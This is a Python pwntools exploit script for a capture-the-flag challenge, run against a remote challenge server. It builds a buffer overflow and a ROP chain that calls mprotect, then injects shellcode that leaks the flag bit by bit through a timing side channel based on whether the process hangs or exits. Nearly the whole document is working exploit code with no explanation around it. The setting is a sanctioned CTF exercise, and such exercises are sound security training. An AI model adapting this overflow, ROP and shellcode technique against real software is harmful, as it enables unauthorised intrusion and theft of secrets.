from pwn import *

context.arch = "amd64"

elf = ELF("./chal",checksec=False)  # Load the binary
rop = ROP(elf) 
local = False

gadgets = {
    'pop rdi': rop.find_gadget(['pop rdi', 'ret'])[0],
    'pop rsi': rop.find_gadget(['pop rsi', 'ret'])[0],
    'pop rdx': rop.find_gadget(['pop rdx', 'ret'])[0],
    'pop rax': rop.find_gadget(['pop rax', 'ret'])[0],
    'syscall': rop.find_gadget(['syscall'])[0],
    'ret': rop.find_gadget(['ret'])[0]
}

flag = ''

for i in range(50):
    flag_char = ''
    for j in range(7):
        # p = process('./chal')
        p = remote("play.h7tex.com", 46258)
        p.recvuntil(b'The flag file object is stored at: ')
        leak = int(p.recvline().strip().decode(), 16)
        # print(hex(leak))
        p.recvuntil(b'Enter input: ')

        shellcode = asm(f'''
        mov rax, {leak+8+i}
        mov dil, [rax]
        and rdi, {1<<j}
        jnz exit_this

        infinite_loop:
        jmp infinite_loop

        exit_this:
        mov rax, 231
        mov rdi, 69
        syscall
        ''')

        payload = b'A' * 0x48
        payload += p64(gadgets['pop rdi']) + p64(leak & ~0xfff)
        payload += p64(gadgets['pop rsi']) + p64(0x2000)
        payload += p64(gadgets['pop rdx']) + p64(7)
        payload += p64(gadgets['pop rax']) + p64(10)
        payload += p64(gadgets['syscall'])
        payload += p64(leak+288)
        payload += shellcode
        p.sendline(payload)

        # the below line is important
        if local == True:
            sleep(0.05)  # Reduced from 0.1
            if p.poll() is None:
                flag_char = '0' + flag_char
                p.close()
            else:
                flag_char = '1' + flag_char
            print(flag_char)
        else:
            sleep(0.1)  # Reduced from 0.2
            try:
                data = p.recv(1, timeout=0.3)  # Reduced from 1.0
                if not data:  # If empty, connection is closed
                    # print("Connection closed")
                    flag_char = '0' + flag_char
            except EOFError:  # If the process exits
                # print("Connection closed")
                flag_char = '1' + flag_char
            print(flag_char)
            p.close()
    flag += chr(int(flag_char, 2))
    print(flag)
    # if flag[-1] == '}':
        # break
    # print(flag)
        

